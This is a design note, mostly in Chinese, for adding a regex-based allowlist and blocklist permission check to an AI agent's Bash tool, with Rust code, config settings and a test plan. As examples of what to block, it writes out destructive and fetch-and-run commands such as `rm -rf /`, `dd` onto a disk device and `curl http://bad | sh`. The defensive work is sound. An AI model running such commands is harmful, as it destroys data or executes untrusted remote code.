## 背景

engine 当前 Bash tool 执行任何命令 · 无任何保护。model 乱跑可能:
- `rm -rf /` 或 `rm -rf ~`
- `sudo ...`(需要密码 · 但仍可能 prompt 卡住)
- `dd if=/dev/zero of=/dev/disk0`
- `git push --force`
- `curl hostile-url | sh`
- kill 系统进程

Claude Code 的 permission 层用 allowlist/blocklist 拦这些。engine 层通用照搬。

## 目标(通用 · 配置驱动)

1. **BashPermission 结构** · 从 config 读两类规则:
   - `blocklist: Vec<String>` · 正则 · 命中直接拒 · 默认带危险命令集合
   - `allowlist_mode: "open" | "strict"` · open=无 allowlist / strict=必须匹配
   - `allowlist: Vec<String>` · 正则 · strict 模式下必须命中
2. **拒绝时**返回 `{"ok":false,"denied":true,"reason":"matched blocklist: rm -rf"}` 结构化
3. **默认 blocklist**(硬 baseline · 用户可扩):
   ```
   ^sudo\s
   rm\s+-rf\s+(/$|/\s|/\*|~|\$HOME)
   ^dd\s+.*of=/dev/
   git\s+push\s+--force(-with-lease)?\s+.*\s+(main|master)
   curl\s+.*\|\s*(sh|bash)
   wget\s+.*\|\s*(sh|bash)
   ```
4. **config.toml**:
   ```toml
   [bash_permission]
   blocklist = ["pattern1", "pattern2"]  # 合并 default
   allowlist_mode = "open"  # or "strict"
   allowlist = []
   ```

## 变动文件

### 1. `crates/nf-agent/src/tool.rs`

`BashTool` 加 `permission: BashPermission` · `call` 先过 `permission.check(cmd)`:

```rust
pub struct BashPermission {
    blocklist: Vec<Regex>,
    allowlist: Vec<Regex>,
    strict: bool,  // true = allowlist 必须匹配
}

impl BashPermission {
    pub fn default_blocklist() -> Vec<&'static str> {
        vec![
            r"^sudo\s",
            r"rm\s+-rf\s+(/$|/\s|/\*|~|\$HOME)",
            r"^dd\s+.*of=/dev/",
            r"git\s+push\s+--force(-with-lease)?\s+.*\s+(main|master)",
            r"curl\s+.*\|\s*(sh|bash)",
            r"wget\s+.*\|\s*(sh|bash)",
        ]
    }

    pub fn check(&self, cmd: &str) -> Result<(), String> {
        for pat in &self.blocklist {
            if pat.is_match(cmd) {
                return Err(format!("matched blocklist: {}", pat.as_str()));
            }
        }
        if self.strict {
            let allowed = self.allowlist.iter().any(|p| p.is_match(cmd));
            if !allowed {
                return Err("no allowlist match (strict mode)".into());
            }
        }
        Ok(())
    }
}

impl BashTool {
    async fn call(&self, args: Value) -> Result<Value> {
        let command = required_string(&args, "command")?;
        if let Err(reason) = self.permission.check(&command) {
            log::warn!("bash denied: {reason} · cmd: {command}");
            return Ok(json!({
                "ok": false,
                "denied": true,
                "reason": reason,
                "command": command,
            }));
        }
        // ... existing execution
    }
}
```

需要 `regex = "1"` 加 Cargo.toml。

### 2. `crates/nf-agent/src/config.rs`

```rust
#[serde(default)]
pub bash_permission: BashPermissionConfig,

#[derive(Debug, Clone, Deserialize, Default)]
pub struct BashPermissionConfig {
    #[serde(default)]
    pub blocklist: Vec<String>,
    #[serde(default = "default_allowlist_mode")]
    pub allowlist_mode: String,  // "open" | "strict"
    #[serde(default)]
    pub allowlist: Vec<String>,
}

fn default_allowlist_mode() -> String { "open".into() }
```

Agent::new 读 config 构造 BashPermission(合并 default_blocklist + user blocklist)。

### 3. `crates/nf-agent/tests/permission.rs`(新)

- `default_blocklist_denies_dangerous`:测 `rm -rf /`, `sudo rm`, `git push --force origin main`, `curl http://bad | sh` · 都 denied:true
